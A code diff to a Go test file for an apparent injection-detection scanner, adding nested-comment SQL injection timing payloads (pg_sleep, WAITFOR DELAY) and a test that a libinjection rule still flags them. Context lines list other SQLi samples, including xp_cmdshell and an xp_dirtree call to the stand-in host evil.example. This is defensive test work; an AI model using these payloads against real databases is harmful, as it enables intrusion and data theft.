@@ -133,6 +133,10 @@ var sqlTokenAcceptedMisses = []string{
 	"; exec xp_regread",
 	"exec master..xp_dirtree '//evil.example/x'",
 	"DBMS_PIPE.RECEIVE_MESSAGE('a',5)",
+	// 8. A nested block comment between the parts of a token: the comment
+	// ends at the first "*/" (libinjection flags both).
+	"pg_sleep/* /* */ */(5)",
+	"WAITFOR /* /* */ */ DELAY '0:0:5'",
 }
 
 // ssiPositives are server-side include directives AEG-SSTI-002 flags, with
@@ -301,5 +305,15 @@ func TestKeySQLiToken(t *testing.T) {
 	}
 	if h, ok := KeySQLi("xp_cmdshell"); ok {
 		t.Errorf("KeySQLi(xp_cmdshell) = %+v: a plain identifier key skips the detectors", h)
+	}
+}
+
+// TestSQLTokenNestedCommentStillSQLi1 checks the claim in accepted miss 8:
+// libinjection (AEG-SQLI-001) flags the nested-comment forms.
+func TestSQLTokenNestedCommentStillSQLi1(t *testing.T) {
+	for _, v := range []string{"pg_sleep/* /* */ */(5)", "WAITFOR /* /* */ */ DELAY '0:0:5'"} {
+		if !hasRule(ScanText(v), "AEG-SQLI-001") {
+			t.Errorf("ScanText(%q) = %+v, want AEG-SQLI-001", v, ScanText(v))
+		}
 	}
 }
